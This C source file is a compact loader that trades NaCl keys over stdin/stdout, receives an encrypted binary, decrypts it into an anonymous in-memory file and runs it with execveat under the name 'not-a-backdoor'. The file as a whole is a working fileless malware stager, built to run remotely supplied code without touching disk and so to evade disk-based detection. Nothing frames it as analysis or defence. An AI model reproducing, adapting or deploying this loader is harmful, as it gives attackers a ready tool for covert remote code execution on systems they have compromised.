#define _GNU_SOURCE

#include <diet/fcntl.h>
#include <diet/stdint.h>
#include <diet/stdlib.h>
#include <diet/unistd.h>

#include <linux/random.h>

#include "execveat.h"
#include "tweetnacl.h"

// #define DEBUG

#define KEY_LENGTH  4096
#define PUB_EXP     65537
#ifdef DEBUG
    #include <diet/stdio.h>
    #define D(x) x
#else
    #define D(x)
#endif


// Patch to allow tweetnacl to work with dietlibc
void randombytes(uint8_t *buf, uint64_t buf_len)
{
    getrandom(buf, buf_len, 0);
}


static int s_write(int fd, uint8_t *buf, size_t buf_len)
{
    ssize_t write_result = write(fd, buf, buf_len); // TODO implement if write_result > 0 but less than len, but should be fine for now
    if (write_result != buf_len)
    {
        D(fprintf(stderr, "[line %i] write() failed: %li != %lu\n", __LINE__, write_result, buf_len));
    }
    return write_result;
}


static int s_read_with_len_allocated(int fd, ssize_t len, uint8_t *buf)
{
    D(fprintf(stderr, "s_read_with_len_allocated() %li\n", len));

    ssize_t num_read = 0;
    while (num_read < len)
    {
        ssize_t read_result = read(fd, buf + num_read, len - num_read);
        if (read_result <= 0)
        {
            break;
        }
        num_read = read_result + num_read;
    }

    if (num_read != len)
    {
        D(fprintf(stderr, "[line %i] read() failed: %li != %lu\n", __LINE__, num_read, len));
    }
    return num_read;
}


static uint8_t* s_read_with_len(int fd, ssize_t len)
{
    uint8_t *buf = malloc(len);
    if (s_read_with_len_allocated(fd, len, buf) != len)
    {
        return NULL;
    }
    return buf;
}


/* UNUSED
static uint8_t* s_read_unknown_len(int fd, ssize_t *num_read_on_success)
{
    uint32_t len = 0;
    ssize_t read_result = read(fd, &len, sizeof(len));
    if (read_result != sizeof(len))
    {
        D(fprintf(stderr, "read read_size failed\n"));
        return NULL;
    }

    D(fprintf(stderr, "num_read: %u\n", len));
    uint8_t *ret = s_read_with_len(fd, len);
    if (ret != NULL && num_read_on_success != NULL)
    {
        *num_read_on_success = len;
    }
    return ret;
}
*/


static int receive(int fd)
{
    // Crypto based of this: https://nacl.cr.yp.to/box.html

    // Generate keypair and send public to server
    uint8_t pk_alice[crypto_box_PUBLICKEYBYTES];
    uint8_t sk_alice[crypto_box_SECRETKEYBYTES];
    crypto_box_keypair(pk_alice, sk_alice);
    s_write(STDOUT_FILENO, pk_alice, sizeof(pk_alice));

    // Read server's public key and nonce
    uint8_t *pk_bob = s_read_with_len(STDIN_FILENO, crypto_box_PUBLICKEYBYTES);
    uint8_t *nonce_buf = s_read_with_len(STDIN_FILENO, crypto_box_NONCEBYTES);

    // Read the ciphertext
    uint32_t ct_buf_len = 0;
    s_read_with_len_allocated(STDIN_FILENO, 4, (uint8_t *)&ct_buf_len);
    ct_buf_len = ct_buf_len + crypto_box_BOXZEROBYTES; // PyNACL trims the first crypto_box_BOXZEROBYTES bytes
    uint8_t *ct_buf = malloc(ct_buf_len);
    for (int i = 0; i < crypto_box_BOXZEROBYTES; i++)
    {
        ct_buf[i] = 0; // zero first crypto_box_BOXZEROBYTES bytes
    }
    uint32_t ct_buf_len_trimmed = ct_buf_len - crypto_box_BOXZEROBYTES; // PyNACL trims the first crypto_box_BOXZEROBYTES bytes
    if (s_read_with_len_allocated(STDIN_FILENO, ct_buf_len_trimmed, ct_buf + crypto_box_BOXZEROBYTES) != ct_buf_len_trimmed)
    {
        D(fprintf(stderr, "Error reading ct_buf\n"));
        goto fail;
    }

    // Decrypt
    uint8_t *pt_buf = malloc(ct_buf_len);
    if (crypto_box_open(pt_buf, ct_buf, ct_buf_len, nonce_buf, pk_bob, sk_alice) != 0)
    {
        D(fprintf(stderr, "Error decrypting (crypto_box_open)\n"));
        goto fail;
    }

    // Copy to memfd
    uint8_t *binary_buf = pt_buf + crypto_box_ZEROBYTES;
    uint32_t binary_buf_len = ct_buf_len - crypto_box_ZEROBYTES;
    ssize_t write_result = write(fd, binary_buf, binary_buf_len);
    if (write_result != binary_buf_len)
    {
        D(fprintf(stderr, "[line %i] write() failed: %li != %u\n", __LINE__, write_result, binary_buf_len));
        return 1;
    }

    // Success
    return 0;

fail:
    return 1;
}


int main()
{
    int mem_fd = memfd_create("", (unsigned int)(MFD_CLOEXEC));
    int download_result = receive(mem_fd);

    if (download_result != 0)
    {
        D(puts("Download failed"));
        return 1;
    }

    const char *new_argv[] = {"not-a-backdoor", NULL};
    const char *new_env[] = { NULL };
    execveat(mem_fd, "", new_argv, new_env, AT_EMPTY_PATH);

    return 0;
}
